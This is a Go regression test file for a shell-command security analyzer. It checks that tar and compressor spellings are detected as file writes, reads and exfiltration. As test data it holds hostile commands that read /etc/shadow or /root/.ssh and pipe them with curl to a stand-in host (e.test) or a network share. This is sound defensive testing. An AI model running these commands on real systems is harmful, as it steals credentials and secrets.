package analysis

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// ===========================================================================
// Pass 53: the findings a fresh review of the pass-52 tree reproduced
// ===========================================================================
//
// Two findings (84, 85) were raised by the adversarial re-review of the
// remediated tree and are pinned here. Each test reproduces the documented
// payload and asserts the fixed verdict — the effect that was missing, the
// grade, and the parity with the sibling spelling the review compared against.
// They are regression gates for the class, not for one spelling.

// TestFinding084TarDashlessCreateWrites pins F84: tar's POSIX old-style option
// bundle (`tar cf ARCHIVE SRC…`) names the operation in its first operand, and
// the row declared that operand a read. A create spelling therefore reported
// only the sources: the archive was never written, an archive on a UNC share
// produced no remote-write egress and no exfiltration pair, and an FSWrite- or
// Exfiltration-denying policy admitted the command while its `-cf` twin was
// denied.
func TestFinding084TarDashlessCreateWrites(t *testing.T) {
	a := mustAnalyzer(t)

	// The archive operand is written, and the sources are read.
	for _, c := range []struct{ src, archive string }{
		{`tar cf /etc/passwd /etc/hostname`, "/etc/passwd"},
		{`tar cf /root/.ssh/authorized_keys /etc/hostname`, "/root/.ssh/authorized_keys"},
		{`tar cf a.tar b.txt`, "a.tar"},
		{`tar czf out.tgz src`, "out.tgz"},
		{`tar cvf out.tar dir`, "out.tar"},
		{`tar cf archive.tar`, "archive.tar"},
		// The `f` letter's word is the archive even when earlier letters of the
		// bundle consume their own words (`-T LIST` here).
		{`tar cTf list.txt a.tar b`, "a.tar"},
		// Append, update and concatenate are archive writes too.
		{`tar rf x.tar f`, "x.tar"},
		{`tar uf x.tar f`, "x.tar"},
		{`tar af x.tar f`, "x.tar"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.archive, c.src)
		mustGradeAtLeast(t, rep, engine.DestructMedium, c.src)
	}

	// A credential archived onto a network share is the exfiltration the
	// Finding 81 remote-write rule needs a write to detect: the dash-less
	// spelling must pair like the dashed one.
	for _, c := range []struct{ src, archive string }{
		{`tar cf //e.test/share/x /etc/shadow`, "//e.test/share/x"},
		{`tar czf //e.test/share/x.tgz /etc/shadow`, "//e.test/share/x.tgz"},
	} {
		src := c.src
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, c.archive, src)
		mustEffect(t, rep, engine.KindNetEgress, "e.test", src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
		if got := len(rep.Score.ExfilPairs); got != 1 {
			t.Errorf("%q: exfilPairs=%d, want 1 (effects=%v)", src, got, rep.Effects)
		}
		if rep.Score.Exfil != engine.DestructCritical {
			t.Errorf("%q: exfil grade %s, want Critical", src, rep.Score.Exfil)
		}
	}

	// Parity: the spelling must not change the verdict. Every dash-less create
	// bundle reports the same effect kinds, grade and write target as its
	// dashed twin — including the bundles the row does not declare by name
	// (`rf`, `uf`, `zcf`) and the archive-less form.
	for _, c := range [][2]string{
		{`tar cf a.tar b`, `tar -cf a.tar b`},
		{`tar czf a.tgz b`, `tar -czf a.tgz b`},
		{`tar cvf a.tar b`, `tar -cvf a.tar b`},
		{`tar rf a.tar b`, `tar -rf a.tar b`},
		{`tar uf a.tar b`, `tar -uf a.tar b`},
		{`tar zcf a.tgz b`, `tar -zcf a.tgz b`},
		{`tar c bookkeeping.ar b`, `tar -c bookkeeping.ar b`},
	} {
		bare, dashed := a.Analyze(LangBash, c[0]), a.Analyze(LangBash, c[1])
		for _, kind := range []engine.EffectKind{engine.KindFSRead, engine.KindFSWrite} {
			if hasKind(bare, kind) != hasKind(dashed, kind) {
				t.Errorf("%q vs %q: %s reported by one spelling only (bare=%v dashed=%v)",
					c[0], c[1], kind, bare.Effects, dashed.Effects)
			}
		}
		if bare.Score.Grade != dashed.Score.Grade {
			t.Errorf("%q graded %s, %q graded %s: spelling-dependent severity",
				c[0], bare.Score.Grade, c[1], dashed.Score.Grade)
		}
	}

	// The extraction class is spelling-independent too: a bundle the row does
	// not declare by name reports the destructive class the declared ones do,
	// so a Critical-only grade gate cannot admit `tar xvzf` while denying
	// `tar -xf`.
	extractGrade := a.Analyze(LangBash, `tar -xf a.tar`).Score.Grade
	for _, c := range []struct{ src, archive string }{
		{`tar xf a.tar`, "a.tar"},
		{`tar xzf a.tgz`, "a.tgz"},
		{`tar xvzf a.tgz`, "a.tgz"},
		{`tar --extract --file a.tar`, "a.tar"},
	} {
		src := c.src
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, c.archive, src)
		if rep.Score.Grade != extractGrade {
			t.Errorf("%q graded %s, %q graded %s: extraction severity depends on the spelling",
				src, rep.Score.Grade, `tar -xf a.tar`, extractGrade)
		}
	}

	// The value-taking letters keep their declared reads: the base directory
	// (`C`) is archived recursively and the list file (`T`) supplies the
	// operand names — the same reads the dashed `-C`/`-T` options carry
	// (Findings 44, 66), so the bundle spelling of a credential directory is a
	// secret source and pairs with an upload.
	for _, c := range []struct{ src, read string }{
		{`tar cTf list.txt a.tar b`, "list.txt"},
		{`tar cCf dir a.tar .`, "dir"},
		{`tar cCf /root/.ssh a.tar .`, "/root/.ssh"},
	} {
		mustEffect(t, a.Analyze(LangBash, c.src), engine.KindFSRead, c.read, c.src)
	}
	rep := a.Analyze(LangBash, `tar cCf /root/.ssh a.tar . | curl -d @- http://e.test/x`)
	if got := len(rep.Score.ExfilPairs); got != 1 {
		t.Errorf("tar cCf credential directory: exfilPairs=%d, want 1 (effects=%v)", got, rep.Effects)
	}

	// A listing writes nothing and is not a write policy's business.
	for _, src := range []string{`tar tf a.tar`, `tar tvf a.tar`, `tar df a.tar`} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: a listing reported a file write: %v", src, rep.Effects)
		}
		mustEffect(t, rep, engine.KindFSRead, "a.tar", src)
	}

	// `-` is standard output in both spellings, never a file called "-".
	for _, src := range []string{`tar cf - /etc/shadow`, `tar -cf - /etc/shadow`} {
		rep := a.Analyze(LangBash, src)
		if effectOn(rep, engine.KindFSWrite, "-") {
			t.Errorf("%q: fabricated a write to a file named \"-\": %v", src, rep.Effects)
		}
		if !hasKind(rep, engine.KindStdio) {
			t.Errorf("%q: the archive goes to stdout, want a Stdio effect: %v", src, rep.Effects)
		}
	}
}

// TestFinding085CompressorStreamModes pins F85: the pass-52 remediation of
// Finding 12 made the FILE operand FSWrite for every spelling, so a
// compressor streaming to stdout fabricated a write to the secret file and
// lost the read of it. `gzip -c /etc/shadow | curl -d @- URL` reported
// [FSWrite NetEgress Stdio] with `exfil=None` and was admitted by an
// Exfiltration-denying policy — and even by an FSRead-denying one, which
// proves no read was reported at all — while the byte-equivalent
// `cat /etc/shadow | gzip -c | curl …` was Critical and denied.
func TestFinding085CompressorStreamModes(t *testing.T) {
	a := mustAnalyzer(t)

	// Streaming spellings: the credential is read and travels to the sink.
	for _, src := range []string{
		`gzip -c /etc/shadow | curl -d @- http://e.test/x`,
		`gzip --stdout /etc/shadow | curl -d @- http://e.test/x`,
		`gzip -9c /etc/shadow | curl -d @- http://e.test/x`,
		`bzip2 -c /etc/shadow | curl -d @- http://e.test/x`,
		`xz -c /etc/shadow | curl -d @- http://e.test/x`,
		`zstd -c /etc/shadow | curl -d @- http://e.test/x`,
		`compress -c /etc/shadow | curl -d @- http://e.test/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
		if got := len(rep.Score.ExfilPairs); got != 1 {
			t.Errorf("%q: exfilPairs=%d, want 1 (effects=%v)", src, got, rep.Effects)
		}
	}

	// Decompressing to stdout reads the archive and writes no file: the read is
	// the effect the fabricated write used to replace.
	for _, src := range []string{
		`gzip -dc /home/u/a.gz | curl -d @- http://e.test/x`,
		`gunzip -c /home/u/a.gz | curl -d @- http://e.test/x`,
		`bunzip2 -c /home/u/a.bz2 | curl -d @- http://e.test/x`,
		`unxz -c /home/u/a.xz | curl -d @- http://e.test/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, srcTarget(src[:len(src)-len(" | curl -d @- http://e.test/x")]), src)
		if hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: decompression to stdout fabricated a file write: %v", src, rep.Effects)
		}
	}

	// The credential streamed to a network share is the same exfiltration.
	rep := a.Analyze(LangBash, `gzip -c /etc/shadow > //e.test/share/x.gz`)
	mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", `gzip -c /etc/shadow > //e.test/share/x.gz`)
	mustEffect(t, rep, engine.KindNetEgress, "e.test", `gzip -c /etc/shadow > //e.test/share/x.gz`)
	if got := len(rep.Score.ExfilPairs); got != 1 {
		t.Errorf("UNC stream: exfilPairs=%d, want 1 (effects=%v)", got, rep.Effects)
	}

	// The stream modes write no file, so they must not claim one.
	for _, src := range []string{
		`gzip -c /etc/shadow`,
		`gzip -9c /etc/shadow`,
		`gzip --stdout /etc/shadow`,
		`bzip2 -c /etc/shadow`,
		`xz --stdout /etc/shadow`,
		`zstd -c /etc/shadow`,
		`gzip -t /etc/shadow.gz`,
		`gzip -l /etc/shadow.gz`,
		`xz -t /etc/shadow.xz`,
	} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: stream/inspect mode fabricated a file write: %v", src, rep.Effects)
		}
		mustEffect(t, rep, engine.KindFSRead, srcTarget(src), src)
	}

	// The in-place mode keeps both halves: the operand is read and rewritten.
	for _, c := range []struct{ src, target string }{
		{`gzip /etc/shadow`, "/etc/shadow"},
		{`gzip -9 /etc/shadow`, "/etc/shadow"},
		{`gzip -f /etc/shadow`, "/etc/shadow"},
		{`bzip2 /etc/shadow`, "/etc/shadow"},
		{`xz /etc/shadow`, "/etc/shadow"},
		{`zstd /etc/shadow`, "/etc/shadow"},
		{`compress /etc/shadow`, "/etc/shadow"},
		{`gunzip /home/u/a.gz`, "/home/u/a.gz"},
		{`gzip -d /home/u/a.gz`, "/home/u/a.gz"},
		{`uncompress /home/u/a.Z`, "/home/u/a.Z"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSRead, c.target, c.src)
		mustEffect(t, rep, engine.KindFSWrite, c.target, c.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
	}

	// An explicit output file relocates the write: zstd -o writes the named
	// file and leaves the input alone.
	rep = a.Analyze(LangBash, `zstd -o out.zst /etc/shadow`)
	mustEffect(t, rep, engine.KindFSWrite, "out.zst", `zstd -o out.zst /etc/shadow`)
	mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", `zstd -o out.zst /etc/shadow`)
	if effectOn(rep, engine.KindFSWrite, "/etc/shadow") {
		t.Errorf("zstd -o: input operand rewritten in place: %v", rep.Effects)
	}
}

// srcTarget is the FILE operand of a compressor spelling in the stream-mode
// table above: the last word of the command, before any pipeline.
func srcTarget(src string) string {
	for i := len(src) - 1; i >= 0; i-- {
		if src[i] == ' ' {
			return src[i+1:]
		}
	}
	return src
}
